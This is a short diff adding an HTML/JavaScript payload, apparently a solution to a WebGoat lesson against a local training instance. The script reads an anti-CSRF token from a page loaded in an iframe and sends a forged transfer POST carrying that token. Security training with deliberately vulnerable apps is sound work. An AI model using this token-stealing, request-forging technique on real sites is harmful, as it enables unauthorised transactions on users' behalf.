@@ -1,0 +1,14 @@
+<script>
+function getToken() {
+    var frame = document.getElementById("frame1");
+    var token = frame.contentDocument.getElementsByTagName('form')[0][1].value;
+    var xhr = new XMLHttpRequest();
+    var url = "http://localhost:8090/WebGoat/attack?transfer=111&token=" + token + "#attack/1721642316/900";
+    xhr.open("POST", url, true);
+    xhr.send(null);
+}
+</script>
+
+<iframe id="frame1" src="attack?transfer=main" onload="getToken()">
+
+
